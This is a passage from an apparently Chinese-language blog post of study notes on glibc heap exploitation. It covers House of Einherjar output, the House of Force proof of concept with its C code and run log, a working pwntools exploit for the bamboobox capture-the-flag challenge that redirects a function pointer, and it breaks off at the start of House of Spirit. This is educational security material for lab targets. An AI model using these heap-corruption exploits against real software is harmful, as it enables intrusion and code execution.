used when you have an off-by-one into a <span class="hljs-built_in">malloc</span><span class="hljs-number">&#x27;</span>ed region with a null byte.<br><br>We allocate <span class="hljs-number">0x38</span> bytes <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;a&#x27;</span><br>a: <span class="hljs-number">0x208c010</span><br>Since we want to overflow <span class="hljs-string">&#x27;a&#x27;</span>, we need the <span class="hljs-string">&#x27;real&#x27;</span> size of <span class="hljs-string">&#x27;a&#x27;</span> after rounding: <span class="hljs-number">0x38</span><br><br>We create a fake chunk wherever we want, in this <span class="hljs-keyword">case</span> we<span class="hljs-number">&#x27;ll</span> create the chunk on the <span class="hljs-built_in">stack</span><br>However, you can also create the chunk in the heap or the bss, as <span class="hljs-type">long</span> as you know its address<br>We <span class="hljs-built_in">set</span> our fwd and bck pointers to point at the fake_chunk in order to pass the unlink <span class="hljs-title function_">checks</span><br><span class="hljs-params">(although we could <span class="hljs-keyword">do</span> the unsafe unlink technique here in some scenarios)</span><br>Our fake chunk at 0x7ffdcc8074d0 looks like:<br><span class="hljs-title function_">prev_size</span> <span class="hljs-params">(not used)</span>: 0x100<br>size: 0x100<br>fwd: 0x7ffdcc8074d0<br>bck: 0x7ffdcc8074d0<br>fwd_nextsize: 0x7ffdcc8074d0<br>bck_nextsize: 0x7ffdcc8074d0<br><br>We allocate 0xf8 bytes <span class="hljs-keyword">for</span> &#x27;b&#x27;.<br>b: 0x208c050<br><br>b.size: 0x101<br>b.size is: <span class="hljs-params">(<span class="hljs-number">0x100</span>)</span> | prev_inuse = <span class="hljs-number">0x101</span><br>We overflow <span class="hljs-string">&#x27;a&#x27;</span> with a single null byte into the metadata of <span class="hljs-string">&#x27;b&#x27;</span><br>b.size: <span class="hljs-number">0x100</span><br>This is easiest <span class="hljs-keyword">if</span> b.size is a multiple of <span class="hljs-number">0x100</span> so you don<span class="hljs-number">&#x27;</span>t change the size of b, only its prev_inuse bit<br>If it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunk<br><br>We write a fake prev_size to the last <span class="hljs-number">8</span> bytes of a so that it will consolidate with our fake chunk<br>Our fake prev_size will be <span class="hljs-number">0x208c040</span> - <span class="hljs-number">0x7ffdcc8074d0</span> = <span class="hljs-number">0xffff800235884b70</span><br><br>Modify fake chunk<span class="hljs-number">&#x27;</span>s size to reflect b<span class="hljs-number">&#x27;</span>s new prev_size<br>Now we <span class="hljs-built_in">free</span> b and this will consolidate with our fake chunk since b prev_inuse is not <span class="hljs-built_in">set</span><br>Our fake chunk size is now <span class="hljs-number">0xffff8002358a5b31</span> (b.size + fake_prev_size)<br><br>Now we can call <span class="hljs-built_in">malloc</span>() and it will begin in our fake chunk<br>Next <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>) is at <span class="hljs-number">0x7ffdcc8074e0</span><br></code></pre></td></tr></table></figure><h3 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h3><p>通过将top chunk的<code>size</code>修改成一个很大的数据（如负号整数），以欺骗libc在请求很大空间的时候能够使用top chunk来分配，这个时候top chunk加上请求空间的大小的时候就会转移到低地址处，例如<code>.bss</code>段。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   This PoC works also with ASLR enabled.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   ( http://phrack.org/issues/66/10.html )</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   Tested in Ubuntu 14.04, 64bit, Ubuntu 18.04</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><span class="hljs-comment">// bss段上的一个字符串</span><br><span class="hljs-type">char</span> bss_var[] = <span class="hljs-string">&quot;This is a string that we want to overwrite.&quot;</span>;<br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span>* argv[])</span><br><br>&#123;<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nWelcome to the House of Force\n\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The top chunk is a special chunk. Is the last in memory &quot;</span><br><br><span class="hljs-string">&quot;and is the chunk that will be resized when malloc asks for more space from the os.\n&quot;</span>);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nIn the end, we will use this to overwrite a variable at %p.\n&quot;</span>, bss_var);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Its current value is: %s\n&quot;</span>, bss_var);<br><br><br><br><br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nLet&#x27;s allocate the first chunk, taking space from the wilderness.\n&quot;</span>);<br><br><span class="hljs-type">intptr_t</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">256</span>);<br><span class="hljs-comment">// 第一个被分配的堆块的位置</span><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The chunk of 256 bytes has been allocated at %p.\n&quot;</span>, p1 - <span class="hljs-number">2</span>);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n&quot;</span>);<br><br><span class="hljs-type">int</span> real_size = malloc_usable_size(p1);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\n&quot;</span>, real_size + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)*<span class="hljs-number">2</span>);<br><br><br><span class="hljs-comment">// 我们需要一个漏洞来修改top chunk的头部</span><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nNow let&#x27;s emulate a vulnerability that can overwrite the header of the Top Chunk\n&quot;</span>);<br><br><br><br><span class="hljs-comment">//----- VULNERABILITY ----</span><br><br><span class="hljs-type">intptr_t</span> *ptr_top = (<span class="hljs-type">intptr_t</span> *) ((<span class="hljs-type">char</span> *)p1 + real_size - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>));<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nThe top chunk starts at %p\n&quot;</span>, ptr_top);<br><br><br><span class="hljs-comment">// 使top chunk的size变大，这样我们就不会使用到mmap这个函数</span><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Old size of top chunk %#llx\n&quot;</span>, *((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> *)((<span class="hljs-type">char</span> *)ptr_top + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>))));<br><span class="hljs-comment">// 设置top chunk的size为-1</span><br>*(<span class="hljs-type">intptr_t</span> *)((<span class="hljs-type">char</span> *)ptr_top + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)) = <span class="hljs-number">-1</span>;<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;New size of top chunk %#llx\n&quot;</span>, *((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> *)((<span class="hljs-type">char</span> *)ptr_top + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>))));<br><br><span class="hljs-comment">//------------------------</span><br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n&quot;</span><br><br>   <span class="hljs-string">&quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n&quot;</span><br><br>   <span class="hljs-string">&quot;overflow) and will then be able to allocate a chunk right over the desired region.\n&quot;</span>);<br><br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">// req是请求的大小，dest是我们的目标地址</span><br><span class="hljs-comment"> * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * new_top = old_top + nb</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * nb = new_top - old_top</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * req + 2sizeof(long) = new_top - old_top</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * req = new_top - old_top - 2sizeof(long)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span><br><span class="hljs-comment">// 计算得到最终的请求大小</span><br><span class="hljs-comment"> * req = dest - old_top - 4*sizeof(long)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> evil_size = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)bss_var - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)*<span class="hljs-number">4</span> - (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)ptr_top;<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;</span><br><br>   <span class="hljs-string">&quot;we will malloc %#lx bytes.\n&quot;</span>, bss_var, ptr_top, evil_size);<br><br><span class="hljs-type">void</span> *new_ptr = <span class="hljs-built_in">malloc</span>(evil_size);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;</span>, new_ptr - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)*<span class="hljs-number">2</span>);<br><br><br><br><span class="hljs-type">void</span>* ctr_chunk = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;malloc(100) =&gt; %p!\n&quot;</span>, ctr_chunk);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we can finally overwrite that value:\n&quot;</span>);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;... old string: %s\n&quot;</span>, bss_var);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;... doing strcpy overwrite with \&quot;YEAH!!!\&quot;...\n&quot;</span>);<br><br><span class="hljs-built_in">strcpy</span>(ctr_chunk, <span class="hljs-string">&quot;YEAH!!!&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;... new string: %s\n&quot;</span>, bss_var);<br><br><br><br>assert(ctr_chunk == bss_var);<br><br><br><br><br><br><span class="hljs-comment">// some further discussion:</span><br><br><span class="hljs-comment">//fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n&quot;);</span><br><br><span class="hljs-comment">//fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;</span><br><br><span class="hljs-comment">//&quot;and we \nwant to set this result to the address of malloc_got_address-8\n\n&quot;);</span><br><br><span class="hljs-comment">//fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n&quot;);</span><br><br><span class="hljs-comment">//fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\n\n&quot;);</span><br><br><span class="hljs-comment">//fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;</span><br><br><span class="hljs-comment">//&quot;\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n&quot;);</span><br><br><br><br><span class="hljs-comment">//fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\n&quot;,p2);</span><br><br><span class="hljs-comment">//fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\n&quot;,malloc_got_address);</span><br><br><br><br><span class="hljs-comment">//fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\n&quot;);</span><br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap/house$ ./house_of_force<br><br>Welcome to the House of Force<br><br>The idea of House of Force is to overwrite the top chunk and let the <span class="hljs-built_in">malloc</span> <span class="hljs-keyword">return</span> an arbitrary value.<br>The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when <span class="hljs-built_in">malloc</span> asks <span class="hljs-keyword">for</span> more space from the os.<br><br>In the end, we will use this to overwrite a variable at <span class="hljs-number">0x602080</span>.<br>Its current value is: This is a <span class="hljs-built_in">string</span> that we want to overwrite.<br><br>Let<span class="hljs-number">&#x27;</span>s allocate the first chunk, taking space from the wilderness.<br>The chunk of <span class="hljs-number">256</span> bytes has been allocated at <span class="hljs-number">0x8ff000</span>.<br><br>Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.<br>Real size (aligned and all that jazz) of our allocated chunk is <span class="hljs-number">280.</span><br><br>Now let<span class="hljs-number">&#x27;</span>s emulate a vulnerability that can overwrite the header of the Top Chunk<br><br>The top chunk starts at <span class="hljs-number">0x8ff110</span><br><br>Overwriting the top chunk size with a big value so we can ensure that the <span class="hljs-built_in">malloc</span> will never call mmap.<br>Old size of top chunk <span class="hljs-number">0x20ef1</span><br>New size of top chunk <span class="hljs-number">0xffffffffffffffff</span><br><br>The size of the wilderness is now gigantic. We can allocate anything without <span class="hljs-built_in">malloc</span>() calling mmap.<br>Next, we will allocate a chunk that will get us right up against the desired region (with an integer<br>overflow) and will then be able to allocate a chunk right over the desired region.<br><br>The value we want to write to at <span class="hljs-number">0x602080</span>, and the top chunk is at <span class="hljs-number">0x8ff110</span>, so accounting <span class="hljs-keyword">for</span> the header size,<br>we will <span class="hljs-built_in">malloc</span> <span class="hljs-number">0xffffffffffd02f50</span> bytes.<br>As expected, the new pointer is at the same place as the old top chunk: <span class="hljs-number">0x8ff110</span><br><br>Now, the next chunk we overwrite will point at our target buffer.<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>) =&gt; <span class="hljs-number">0x602080</span>!<br>Now, we can finally overwrite that value:<br>... old <span class="hljs-built_in">string</span>: This is a <span class="hljs-built_in">string</span> that we want to overwrite.<br>... doing <span class="hljs-built_in">strcpy</span> overwrite with <span class="hljs-string">&quot;YEAH!!!&quot;</span>...<br>... new <span class="hljs-built_in">string</span>: YEAH!!!<br></code></pre></td></tr></table></figure><p><code>libc_2.29</code>增加了对top_chunk的size的检查（<code>size &gt; av-&gt;system_mem</code>），除非我们能够修改<code>av-&gt;system_mem</code>，否则该方法失效。</p><h4 id="hitcon-traning-bamboobox"><a href="#hitcon-traning-bamboobox" class="headerlink" title="hitcon_traning_bamboobox"></a>hitcon_traning_bamboobox</h4><p>将top_chunk转移到存放函数指针的chunk附近，再次分配堆块修改函数指针为后门函数。</p><p>WP如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&quot;./bamboobox&quot;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>magic = <span class="hljs-number">0x400D49</span><br><br>sdla = <span class="hljs-keyword">lambda</span> infor, data : sh.sendlineafter(infor, data)<br>sda = <span class="hljs-keyword">lambda</span> infor, data : sh.sendafter(infor, data)<br>sd = <span class="hljs-keyword">lambda</span> data : sh.send(data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, context</span>):<br>    sdla(<span class="hljs-string">&quot;Your choice:&quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sdla(<span class="hljs-string">&quot;Please enter the length of item name:&quot;</span>, <span class="hljs-built_in">str</span>(size))<br>    sda(<span class="hljs-string">&quot;Please enter the name of item:&quot;</span>, context)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">index, size, context</span>):<br>    sdla(<span class="hljs-string">&quot;Your choice:&quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sdla(<span class="hljs-string">&quot;Please enter the index of item:&quot;</span>, <span class="hljs-built_in">str</span>(index))<br>    sdla(<span class="hljs-string">&quot;Please enter the length of item name:&quot;</span>, <span class="hljs-built_in">str</span>(size))<br>    sda(<span class="hljs-string">&quot;Please enter the new name of the item:&quot;</span>, context)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove</span>(<span class="hljs-params">index</span>):<br>    sdla(<span class="hljs-string">&quot;Your choice:&quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    sdla(<span class="hljs-string">&quot;Please enter the index of item:&quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quit</span>():<br>    sdla(<span class="hljs-string">&quot;Your choice:&quot;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br><br>add(<span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br><span class="hljs-comment"># top_chunk.size -&gt; -1</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>change(<span class="hljs-number">0</span>, <span class="hljs-number">0x40</span>, payload)<br><span class="hljs-comment"># req = dest - old_top - 0x10</span><br>req = -<span class="hljs-number">0x70</span><br>add(req, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br><span class="hljs-comment"># gdb.attach(sh)</span><br>add(<span class="hljs-number">0x10</span>, p64(magic)*<span class="hljs-number">2</span>)<br>quit()<br>sh.recv()<br></code></pre></td></tr></table></figure><h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h3><p>如果我们希望对一块fastbin大小的不可控内存区域进行读写，并恰好满足一下两个条件：</p><ul><li>该区域的前后可控</li><li>存在一个可控指针可以作为free()的参数</li></ul><p>该技术一般用来辅助栈溢出，假如我们能够覆盖一个即将被释放的指针，我们就可以将这个指针指向返回地址附近，并在附近构造一个fake_chunk，再利用该技术将fake_chunk变成一个真正的chunk。</p><p><strong>需要注意的是，<code>PREV_INUSE</code>位不会影响free的结果，但是<code>IS_MMAPPED</code>和<code>NON_MAIN_ARENA</code>都要为零，其次，fake_chunk的size要在32到128之间，next_chunk的size必须要大于0x10并且小于<code>av-&gt;system_mem</code>（即小于0x21000）。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br><br>&#123;<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file demonstrates the house of spirit attack.\n&quot;</span>);<br><br><br><br><span 